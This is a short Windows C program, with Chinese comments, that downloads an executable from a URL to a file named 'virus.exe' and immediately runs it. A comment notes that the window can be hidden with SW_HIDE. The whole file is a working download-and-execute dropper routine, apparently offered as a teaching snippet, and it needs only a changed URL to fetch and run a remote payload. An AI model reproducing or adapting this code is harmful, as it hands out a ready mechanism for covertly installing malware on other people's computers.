#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include "urlmon.h"
#pragma comment (lib, "urlmon")
/*
	使用UrlDownloadToFile必须包含Urlmon.h头和Urlmon.lib导入库文件
*/
void main() {
	char szUrl[MAX_PATH] = "http://localhost:8080/Everything.exe";
	char szVirusPath[MAX_PATH] = "D:\\virus.exe";
	
	// 该函数的不加A或W默认是W,要注意,否则就会返回0x800c000d(未知协议)
	HRESULT result = URLDownloadToFileA(NULL, szUrl, szVirusPath, 0, NULL);

	if (S_OK == result){
		printf("Success DownLoad\n");
	}
	else{
		printf("UnSuccess\n");
	}


	// 下载好目标程序之后调用该函数进行执行,一般可以传递SW_HIDE参数进行窗口隐藏
	WinExec(szVirusPath, SW_SHOW);
	system("pause");
}